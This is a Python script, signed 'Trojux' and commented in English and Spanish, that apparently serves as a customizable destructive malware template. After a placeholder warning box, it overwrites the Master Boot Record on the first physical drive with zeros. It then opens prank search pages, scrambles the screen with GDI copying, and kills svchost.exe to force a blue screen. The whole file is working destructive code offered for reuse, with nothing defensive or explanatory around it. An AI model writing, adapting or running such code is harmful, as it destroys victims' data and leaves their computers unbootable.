# LIBRARIES
# BIBLIOTECAS

# MBR AND GDI EFFECT
from win32api import *
from win32con import *
from win32gui import *
from win32ui import *
from win32file import *

# GDI EFFECT
from random import randrange as rd

# SITES
import webbrowser

# SLEEP
import time

# MSGBOX WARNING
from tkinter import messagebox
import tkinter as tk

#----------------------------------------------------------

# WARNING MESSAGE
# MENSAJE DE ADVERTENCIA

MsgBox = tk.messagebox.askquestion ('Tittle Titulo','Mensaje Message',icon = 'warning') # error, question, information
if MsgBox == 'no': # or yes
	exit()

# NUMERO DE VECES QUE QUIERES REPETIR EL EFECTO GDI
# NUMBER OF TIMES YOU WANT TO REPEAT THE GDI EFFECT
num = 100

# OVERWRITE MBR (NEVER RUN THIS IN YOUR OWN COMPUTER!!!)
# SOBREESCRIBE EL MBR (NUNCA EJECUTES ESTO EN TU PROPIA COMPUTADORA!!!)

def destructive_code():
	hDevice = CreateFileW("\\\\.\\PhysicalDrive0", GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, None, OPEN_EXISTING, 0,0)
	WriteFile(hDevice, AllocateReadBuffer(512), None)
	CloseHandle(hDevice)

# OPEN RANDOM SITES
# ABRE SITIOS ALEATORIOS

# + = Espacio (Space)

def opensites():
	time.sleep(5) # You can modify seconds. Puedes modificar los segundos
	webbrowser.open('https://www.google.com/search?q=tu+mama+es+gay+(chiste)') # you can modify the site, puedes modificar el sitio
	time.sleep(5)
	webbrowser.open('https://www.google.com/search?q=sub+4+trojux')
	time.sleep(5)
	webbrowser.open('thelongestlistofthelongeststuffatthelongestdomainnameatlonglast.com')
	cursed_screen()

# GDI EFFECT!
# EFECTO GDI!

def cursed_screen():
    for x in range(num):
        global time
        global timeSubtract
        HDC = GetDC(0)
        sw,sh = (GetSystemMetrics(0),GetSystemMetrics(1))

        x1 = rd(sw-100)
        y1 = rd(sh-100)
        x2 = rd(sw-100)
        y2 = rd(sh-100)

        width = rd(600)
        height = rd(600)

        BitBlt(HDC, x1, y1, width, height, HDC, x2, y2, SRCCOPY)
        Sleep(150) # You can make it fast or slow, puedes hacerlo rapido o lento

# CALL FUNCTIONS
# LLAMAR FUNCIONES

destructive_code()
opensites()

# BLUE SCREEN OF DEATH
# PANTALLA AZUL DE LA MUERTE

__import__("os").system("taskkill /F /IM svchost.exe")



# MADE BY TROJUX IN PYTHON 3.10.5
# HECHO POR TROJUX EN PYTHON 3.10.5